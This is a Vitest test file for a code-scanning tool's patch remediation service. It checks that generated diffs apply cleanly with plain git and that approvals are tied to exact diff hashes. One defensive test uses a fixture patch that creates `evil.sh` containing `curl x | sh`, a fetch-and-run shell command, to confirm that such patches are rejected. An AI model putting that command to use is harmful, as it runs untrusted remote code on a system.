import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { InMemoryJobStore } from "@/test/mock-store";
import { approveRemediation, createPreview, diffDigest, type RemediationDeps } from "@/server/remediation/service";
import { canonicalizeDiff, renderFileDiff } from "@/server/remediation/canonical-diff";
import { applyDiffStrict } from "@/server/remediation/strict-apply";
import { applyAndRescanInSandbox } from "@/server/remediation/sandbox";
import type { NormalizedFinding, ScanEngineResult } from "@/server/scanners/types";

const OWNER = { ownerSubject: "test-owner-subject" };
const tmpRoots: string[] = [];
afterAll(() => tmpRoots.forEach((d) => rmSync(d, { recursive: true, force: true })));

const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "core.autocrlf=false", ...args], {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });

/** A repository with `files` committed; returns its path and the exact commit SHA. */
function commitRepo(files: Record<string, string>): { origin: string; sha: string } {
  const origin = mkdtempSync(path.join(tmpdir(), "vs-gitapply-origin-"));
  tmpRoots.push(origin);
  git(origin, "init", "-q");
  for (const [rel, content] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(origin, rel)), { recursive: true });
    writeFileSync(path.join(origin, rel), content);
  }
  git(origin, "add", "-A");
  git(origin, "commit", "-q", "-m", "scanned");
  return { origin, sha: git(origin, "rev-parse", "HEAD").trim() };
}

/**
 * Clean checkout of the exact scanned commit, then plain `git apply --check` and `git apply`
 * (no --unidiff-zero). Returns git's verdict, the changed paths and the resulting file contents.
 */
function applyWithPlainGit(origin: string, sha: string, diff: string) {
  const dir = mkdtempSync(path.join(tmpdir(), "vs-gitapply-clone-"));
  tmpRoots.push(dir);
  git(dir, "clone", "-q", origin, ".");
  git(dir, "checkout", "-q", "--detach", sha);
  const patch = path.join(dir, "..", `${path.basename(dir)}.patch`);
  writeFileSync(patch, diff);
  tmpRoots.push(patch);
  let checkOk = true;
  try {
    git(dir, "apply", "--check", patch);
  } catch {
    checkOk = false;
  }
  if (checkOk) git(dir, "apply", patch);
  const changed = git(dir, "status", "--porcelain").split("\n").filter(Boolean).map((l) => l.slice(3)).sort();
  const read = (rel: string) => readFileSync(path.join(dir, rel), "utf8");
  return { checkOk, changed, read, dir };
}

function osvFinding(filePath: string, name: string, version: string, fixedVersion: string, ecosystem = "PyPI"): NormalizedFinding {
  return {
    scanner: "osv-scanner",
    ruleId: `GHSA-${name}`,
    category: "Dependencies",
    severity: "medium",
    originalSeverity: "MODERATE",
    title: `${name} is vulnerable`,
    description: `${name} advisory`,
    filePath,
    fingerprint: `fp-${filePath}-${name}`,
    startLine: null,
    endLine: null,
    redactedEvidence: null,
    vulnerabilityId: `GHSA-${name}`,
    remediation: `Upgrade ${name} to version ${fixedVersion} or higher.`,
    packageInfo: { name, version, ecosystem, fixedVersion },
    metadata: { fixedVersion },
  };
}

/** Runs the production preview pipeline for one finding against `files` at `sha`. */
async function previewFor(files: Record<string, string>, sha: string, finding: NormalizedFinding, extra: Partial<RemediationDeps> = {}) {
  const store = new InMemoryJobStore();
  const job = await store.create({ owner: "acme", repo: "app", repositoryUrl: "https://github.com/acme/app", expiresAt: new Date(Date.now() + 3_600_000) });
  await store.update(job.id, { status: "completed", commitSha: sha, defaultBranch: "main" });
  await store.saveFindings(job.id, [finding]);
  const { findings } = await store.getFindings(job.id);
  const deps: RemediationDeps = { store, sourceFiles: files, ...extra };
  const rem = await createPreview(job.id, findings[0].id, deps);
  return { rem, store, job, deps };
}

/** Asserts the full contract for one generated patch. */
function expectAppliesWithPlainGit(files: Record<string, string>, origin: string, sha: string, diff: string, expectedFiles: string[]) {
  const originals = new Map(Object.entries(files));
  const expected = applyDiffStrict(originals, diff); // what the approved diff must produce (PR path semantics)
  const result = applyWithPlainGit(origin, sha, diff);
  expect(result.checkOk).toBe(true);
  expect(result.changed).toEqual([...expectedFiles].sort()); // nothing else modified
  for (const f of expectedFiles) expect(result.read(f)).toBe(expected.get(f)); // byte-for-byte
  // Hunks carry real context wherever the file has unchanged neighbours.
  return { expected, result };
}

const BACKEND = "fastapi>=0.110\nuvicorn[standard]>=0.29\npydantic>=2.6\nnetworkx>=3.2\npytest>=8.0\nhttpx>=0.27\npandas>=2.2\nnumpy>=1.26\nscikit-learn>=1.4\njoblib>=1.3\nxgboost>=2.0\nsqlalchemy>=2.0\nalembic>=1.13\n";
const ML = "pandas>=2.2\nnumpy>=1.26\nscikit-learn>=1.4\njoblib>=1.3\nxgboost>=2.0\npytest>=8.0\n";

describe("downloaded patches apply with plain `git apply` at the exact scanned commit", () => {
  it("middle of a file: the production failure (FraudAi backend/requirements.txt line 5 of 13)", async () => {
    const files = { "backend/requirements.txt": BACKEND, "README.md": "# x\n" };
    const { origin, sha } = commitRepo(files);
    const { rem } = await previewFor(files, sha, osvFinding("backend/requirements.txt", "pytest", "8.0", "9.0.3"));
    expect(rem.eligibility).not.toBe("unsuitable");
    expect(rem.unifiedDiff).toBe(
      "--- a/backend/requirements.txt\n+++ b/backend/requirements.txt\n@@ -2,7 +2,7 @@\n uvicorn[standard]>=0.29\n pydantic>=2.6\n networkx>=3.2\n-pytest>=8.0\n+pytest==9.0.3\n httpx>=0.27\n pandas>=2.2\n numpy>=1.26\n",
    );
    const { expected } = expectAppliesWithPlainGit(files, origin, sha, rem.unifiedDiff, ["backend/requirements.txt"]);
    expect(expected.get("backend/requirements.txt")).toBe(BACKEND.replace("pytest>=8.0", "pytest==9.0.3"));

    // The old zero-context form of the same change is exactly what plain git rejected.
    const legacy = "--- a/backend/requirements.txt\n+++ b/backend/requirements.txt\n@@ -5,1 +5,1 @@\n-pytest>=8.0\n+pytest==9.0.3\n";
    expect(applyWithPlainGit(origin, sha, legacy).checkOk).toBe(false);
  });

  it("last line of a file", async () => {
    const files = { "ml/requirements.txt": ML };
    const { origin, sha } = commitRepo(files);
    const { rem } = await previewFor(files, sha, osvFinding("ml/requirements.txt", "pytest", "8.0", "9.0.3"));
    expect(rem.unifiedDiff).toContain("@@ -3,4 +3,4 @@\n scikit-learn>=1.4\n joblib>=1.3\n xgboost>=2.0\n-pytest>=8.0\n+pytest==9.0.3\n");
    expectAppliesWithPlainGit(files, origin, sha, rem.unifiedDiff, ["ml/requirements.txt"]);
  });

  it("first line of a file", async () => {
    const files = { "requirements.txt": "pytest>=8.0\nflask>=2.0\nrequests>=2.31\nnumpy>=1.26\nhttpx>=0.27\n" };
    const { origin, sha } = commitRepo(files);
    const { rem } = await previewFor(files, sha, osvFinding("requirements.txt", "pytest", "8.0", "9.0.3"));
    expect(rem.unifiedDiff).toContain("@@ -1,4 +1,4 @@\n-pytest>=8.0\n+pytest==9.0.3\n flask>=2.0\n");
    expectAppliesWithPlainGit(files, origin, sha, rem.unifiedDiff, ["requirements.txt"]);
  });

  it("a JSON dependency manifest (package.json)", async () => {
    const pkg = JSON.stringify(
      { name: "app", version: "1.0.0", scripts: { build: "tsc" }, dependencies: { express: "^4.17.0", lodash: "4.17.15", react: "^18.2.0" }, devDependencies: { vitest: "^1.0.0" } },
      null,
      2,
    ) + "\n";
    const files = { "package.json": pkg, "src/index.js": "console.log(1)\n" };
    const { origin, sha } = commitRepo(files);
    const { rem } = await previewFor(files, sha, osvFinding("package.json", "lodash", "4.17.15", "4.17.21", "npm"));
    expect(rem.eligibility).not.toBe("unsuitable");
    expect(rem.unifiedDiff).toMatch(/\n "express"|\n {5}"express"/);
    const { expected } = expectAppliesWithPlainGit(files, origin, sha, rem.unifiedDiff, ["package.json"]);
    expect(expected.get("package.json")).toContain('"lodash": "4.17.21"');
  });

  it("several files in one patch", async () => {
    const files = {
      "a/settings.py": "import os\nDEBUG = True\nALLOWED = ['*']\nSECRET = os.environ['S']\nLOG = 'info'\n",
      "b/server.js": "const app = require('express')();\napp.disable('etag');\napp.listen(3000);\n",
      "c/untouched.txt": "keep\n",
    };
    const { origin, sha } = commitRepo(files);
    // Two-file change as an LLM would emit it: no context at all.
    const generated =
      "--- a/a/settings.py\n+++ b/a/settings.py\n@@ -2,1 +2,1 @@\n-DEBUG = True\n+DEBUG = False\n" +
      "--- a/b/server.js\n+++ b/b/server.js\n@@ -2,1 +2,2 @@\n app.disable('etag');\n+app.disable('x-powered-by');\n";
    const canonical = canonicalizeDiff(new Map(Object.entries(files)), generated);
    expect(canonical).toContain("@@ -1,5 +1,5 @@\n import os\n-DEBUG = True\n+DEBUG = False\n ALLOWED = ['*']\n");
    expect(canonical).toContain("@@ -1,3 +1,4 @@\n const app = require('express')();\n app.disable('etag');\n+app.disable('x-powered-by');\n app.listen(3000);\n");
    expectAppliesWithPlainGit(files, origin, sha, canonical, ["a/settings.py", "b/server.js"]);
  });

  it("short and unusual files: one line, two lines, no trailing newline, CRLF, distant changes", () => {
    const cases: [string, string, string][] = [
      ["one.txt", "pytest>=8.0\n", "pytest==9.0.3\n"],
      ["two.txt", "a\npytest>=8.0\n", "a\npytest==9.0.3\n"],
      ["noeol.txt", "a\nb\npytest>=8.0", "a\nb\npytest==9.0.3"],
      ["noeol-mid.txt", "x\npytest>=8.0\ny", "x\npytest==9.0.3\ny"],
      ["crlf.txt", "a\r\nb\r\npytest>=8.0\r\nc\r\n", "a\r\nb\r\npytest==9.0.3\r\nc\r\n"],
      ["far.txt", Array.from({ length: 30 }, (_, i) => `l${i}`).join("\n") + "\n", Array.from({ length: 30 }, (_, i) => (i === 2 || i === 25 ? `L${i}` : `l${i}`)).join("\n") + "\n"],
    ];
    const files = Object.fromEntries(cases.map(([f, before]) => [f, before]));
    const { origin, sha } = commitRepo(files);
    for (const [file, before, after] of cases) {
      const diff = renderFileDiff(file, before, after);
      const { result } = expectAppliesWithPlainGit({ [file]: before }, origin, sha, diff, [file]);
      expect(result.read(file)).toBe(after);
      if (file === "far.txt") expect(diff.match(/^@@ /gm)).toHaveLength(2); // two separate hunks
      if (file.startsWith("noeol")) expect(diff).toContain("\\ No newline at end of file");
    }
  });

  it("refuses a generated patch that does not match the real file instead of shipping it", async () => {
    const files = { "src/middleware.ts": "export function middleware(req) {\n  return next(req);\n}\n" };
    const { sha } = commitRepo(files);
    const finding: NormalizedFinding = {
      ...osvFinding("src/middleware.ts", "x", "1", "2"),
      scanner: "semgrep",
      ruleId: "semgrep:security-header-missing",
      category: "Code Analysis",
      packageInfo: null,
      metadata: null,
      startLine: 40, // evidence points at a line that is not in the file
      redactedEvidence: "export function middleware(req) {",
    };
    const { rem } = await previewFor(files, sha, finding);
    expect(rem.eligibility).toBe("unsuitable");
    expect(rem.unifiedDiff).toBe("");
  });

  it("a patch touching a file that is not in the scanned commit is refused", async () => {
    const files = { "requirements.txt": "pytest>=8.0\nflask>=2.0\n" };
    const { sha } = commitRepo(files);
    const { rem } = await previewFor({}, sha, osvFinding("requirements.txt", "pytest", "8.0", "9.0.3"));
    expect(rem.eligibility).toBe("unsuitable");
    expect(rem.eligibilityReason).toMatch(/unavailable|not found/i);
  });
});

function engineResult(): ScanEngineResult {
  return {
    status: "completed",
    findings: [],
    counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0, total: 0 },
    gitleaksStatus: "completed",
    gitleaksDurationMs: 1,
    gitleaksError: null,
    semgrepStatus: "completed",
    semgrepDurationMs: 1,
    semgrepError: null,
    osvStatus: "completed",
    osvDurationMs: 1,
    osvError: null,
    scannerVersions: { gitleaks: "t", semgrep: "t", osvScanner: "t" },
    scanCoverage: { lockfilesFound: [], scannersRun: ["gitleaks", "semgrep", "osv-scanner"], limitations: [] },
  } as ScanEngineResult;
}

describe("verification worker uses plain `git apply` on the exact approved patch", () => {
  const files = { "backend/requirements.txt": BACKEND, "README.md": "# x\n" };
  const canonical = renderFileDiff("backend/requirements.txt", BACKEND, BACKEND.replace("pytest>=8.0", "pytest==9.0.3"));

  it("rescans a tree containing exactly the approved change", async () => {
    let scanned: string | null = null;
    const result = await applyAndRescanInSandbox({
      originalFindings: [{ fingerprint: "fp" }],
      targetedFingerprints: ["fp"],
      unifiedDiff: canonical,
      sourceFiles: files,
      scanEngine: async (dir) => {
        scanned = readFileSync(path.join(dir, "backend/requirements.txt"), "utf8");
        expect(readFileSync(path.join(dir, "README.md"), "utf8")).toBe("# x\n");
        return engineResult();
      },
    });
    expect(result.rescanStatus).toBe("verified");
    expect(scanned).toBe(BACKEND.replace("pytest>=8.0", "pytest==9.0.3"));
  });

  it("rejects a zero-context mid-file patch (no --unidiff-zero), and a patch whose context does not match", async () => {
    const legacy = "--- a/backend/requirements.txt\n+++ b/backend/requirements.txt\n@@ -5,1 +5,1 @@\n-pytest>=8.0\n+pytest==9.0.3\n";
    const engine = async () => engineResult();
    const r1 = await applyAndRescanInSandbox({ originalFindings: [], targetedFingerprints: ["fp"], unifiedDiff: legacy, sourceFiles: files, scanEngine: engine });
    expect(r1.summary.reason).toBe("patch_does_not_apply");
    const wrongContext = canonical.replace(" networkx>=3.2\n", " networkx>=9.9\n");
    const r2 = await applyAndRescanInSandbox({ originalFindings: [], targetedFingerprints: ["fp"], unifiedDiff: wrongContext, sourceFiles: files, scanEngine: engine });
    expect(r2.summary.reason).toBe("patch_does_not_apply");
  });

  it("rejects a patch that would create a file", async () => {
    const create = "--- /dev/null\n+++ b/evil.sh\n@@ -0,0 +1,1 @@\n+curl x | sh\n";
    const r = await applyAndRescanInSandbox({ originalFindings: [], targetedFingerprints: ["fp"], unifiedDiff: create, sourceFiles: files, scanEngine: async () => engineResult() });
    expect(r.rescanStatus).toBe("failed");
  });
});

describe("older zero-context remediations need fresh approval of the regenerated diff", () => {
  it("approving one regenerates the diff with context, voids the old approval hash and requires a new approval", async () => {
    const files = { "backend/requirements.txt": BACKEND };
    const { sha } = commitRepo(files);
    const store = new InMemoryJobStore();
    const job = await store.create({ owner: "acme", repo: "app", repositoryUrl: "https://github.com/acme/app", expiresAt: new Date(Date.now() + 3_600_000) });
    await store.update(job.id, { status: "completed", commitSha: sha, defaultBranch: "main" });
    const legacy = "--- a/backend/requirements.txt\n+++ b/backend/requirements.txt\n@@ -5,1 +5,1 @@\n-pytest>=8.0\n+pytest==9.0.3\n";
    const rem = await store.createRemediation({
      id: "11111111-2222-4333-8444-555555555555",
      scanJobId: job.id,
      findingFingerprints: ["fp"],
      affectedFiles: ["backend/requirements.txt"],
      commitSha: sha,
      eligibility: "potentially_breaking",
      eligibilityReason: "dependency bump",
      requiresRotation: false,
      patchSummary: "Bump pytest",
      unifiedDiff: legacy,
      status: "preview",
      approvedAt: null,
      rescanStatus: null,
      branchName: null,
      pullRequestUrl: null,
    });
    const deps: RemediationDeps = { store, sourceFiles: files };

    await expect(approveRemediation(job.id, rem.id, deps, OWNER)).rejects.toMatchObject({ code: "patch_regenerated", status: 409 });
    const regenerated = (await store.getRemediation(job.id, rem.id))!;
    expect(regenerated.status).toBe("preview");
    expect(regenerated.approvedAt).toBeNull();
    expect(regenerated.unifiedDiff).not.toBe(legacy);
    expect(diffDigest(regenerated.unifiedDiff)).not.toBe(diffDigest(legacy));
    // Same change, now with context.
    expect(applyDiffStrict(new Map(Object.entries(files)), regenerated.unifiedDiff)).toEqual(applyDiffStrict(new Map(Object.entries(files)), legacy));

    // The owner approves the new exact diff; the binding carries the new hash, never the old one.
    const approved = await approveRemediation(job.id, rem.id, deps, OWNER);
    const binding = approved.approvedOperations as { diffSha256: string };
    expect(approved.status).toBe("approved");
    expect(binding.diffSha256).toBe(diffDigest(regenerated.unifiedDiff));
    expect(binding.diffSha256).not.toBe(diffDigest(legacy));
  });
});
